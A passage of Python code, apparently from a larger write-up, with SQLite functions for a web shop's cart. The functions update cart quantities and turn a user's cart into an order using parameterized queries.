        cursor.execute('UPDATE cart SET quantity = ? WHERE user_id = ? AND product_id = ?', (new_quantity, user_id, product_id))
    else:
        cursor.execute('INSERT INTO cart (user_id, product_id, quantity) VALUES (?, ?, ?)', (user_id, product_id, quantity))
    conn.commit()
    conn.close()

def update_cart_quantity(product_id, user_id, quantity):
    conn = get_db_connection()
    if int(quantity) <= 0:
        conn.execute('DELETE FROM cart WHERE user_id = ? AND product_id = ?', (user_id, product_id))
    else:
        conn.execute('UPDATE cart SET quantity = ? WHERE user_id = ? AND product_id = ?', (quantity, user_id, product_id))
    conn.commit()
    conn.close()

def create_order(user_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cart_items = get_cart_items(user_id)
    if not cart_items: return None
    total_amount = sum(item['price'] * item['quantity'] for item in cart_items)
    order_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute('INSERT INTO orders (user_id, order_date, status, total_amount) VALUES (?, ?, ?, ?)',(user_id, order_date, 'Pending', total_amount))
    order_id = cursor.lastrowid
    for item in cart_items:
        cursor.execute('INSERT INTO order_items (order_id, product_id, quantity, price_at_purchase) VALUES (?, ?, ?, ?)',(order_id, item['id'], item['quantity'], item['price']))
    cursor.execute('DELETE FROM cart WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
    return order_id

```

---

